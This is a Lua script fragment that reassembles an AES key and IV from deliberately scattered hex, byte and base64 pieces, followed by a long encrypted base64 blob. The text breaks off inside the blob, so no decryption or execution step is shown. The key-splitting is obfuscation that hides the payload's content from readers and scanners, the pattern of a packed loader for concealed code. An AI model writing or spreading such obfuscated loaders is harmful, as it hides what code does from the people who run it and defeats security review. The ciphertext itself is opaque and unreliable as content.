local fragments = {
        {t="hex", d="a8"},
        {t="bytes", d={48,20,52}},
        {t="bytes", d={102,182}},
        {t="bytes", d={103,158,240}},
        {t="hex", d="0e3c"},
        {t="hex", d="9d3b57"},
        {t="bytes", d={56,185}},
        {t="bytes", d={149,176}},
        {t="bytes", d={16}},
        {t="hexchars", d={"1","1","5","f"}},
        {t="bytes", d={246}},
        {t="hex", d="16b05494"},
        {t="hexchars", d={"7","c","4","d"}},
        {t="hex", d="5081ad85"}
}

local function b64decode(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = data:gsub('[^'..b..'=]', '')
    local t, m, a = {}, 0, 0
    for i = 1, #data do
        local c = data:sub(i,i)
        if c ~= '=' then
            local idx = b:find(c, 1, true)
            if not idx then break end
            a = bit32.bor(bit32.lshift(a, 6), (idx - 1))
            m = m + 6
            if m >= 8 then
                m = m - 8
                local byte = bit32.band(bit32.rshift(a, m), 0xFF)
                t[#t+1] = string.char(byte)
                a = bit32.band(a, (bit32.lshift(1, m) - 1))
            end
        end
    end
    return table.concat(t)
end

local function byte_to_hex(n)
    return string.format("%02x", bit32.band(n or 0, 0xFF))
end

local function bytes_to_hex(str)
    local out = {}
    for i = 1, #str do
        out[#out+1] = string.format("%02x", str:byte(i))
    end
    return table.concat(out)
end

local function rebuildKeyHex()
    local acc = {}
    for i = 1, #fragments do
        local f = fragments[i]
        if f.t == "hex" then
            acc[#acc+1] = f.d
        elseif f.t == "hexchars" then
            acc[#acc+1] = table.concat(f.d)
        elseif f.t == "bytes" then
            local tmp = {}
            for j = 1, #f.d do
                tmp[#tmp+1] = byte_to_hex(f.d[j])
            end
            acc[#acc+1] = table.concat(tmp)
        elseif f.t == "b64" then
            acc[#acc+1] = bytes_to_hex(b64decode(f.d))
        else
            acc[#acc+1] = tostring(f.d)
        end
    end
    local hex = table.concat(acc)
    assert(#hex == 64, "Rebuilt AES key must be 64 hex chars, got "..#hex)
    return hex
end

local AES_KEY_HEX = rebuildKeyHex()

local iv_fragments = {
        {t="hex", d="e185ac"},
        {t="hex", d="25"},
        {t="hexchars", d={"8","3","5","9"}},
        {t="b64", d="DA=="},
        {t="hex", d="6f2a15"},
        {t="hexchars", d={"8","b","8","b"}},
        {t="hex", d="b4"},
        {t="hexchars", d={"e","c","d","e","a","0"}}
}

local function rebuild_iv_hex()
    local acc = {}
    for i = 1, #iv_fragments do
        local f = iv_fragments[i]
        if f.t == "hex" then
            acc[#acc+1] = f.d
        elseif f.t == "hexchars" then
            acc[#acc+1] = table.concat(f.d)
        elseif f.t == "bytes" then
            local tmp = {}
            for j = 1, #f.d do
                tmp[#tmp+1] = byte_to_hex(f.d[j])
            end
            acc[#acc+1] = table.concat(tmp)
        elseif f.t == "b64" then
            acc[#acc+1] = bytes_to_hex(b64decode(f.d))
        else
            acc[#acc+1] = tostring(f.d)
        end
    end
    return table.concat(acc)
end

local IV_HEX = rebuild_iv_hex()

local cipher_fragments = {
        {t="b64", d="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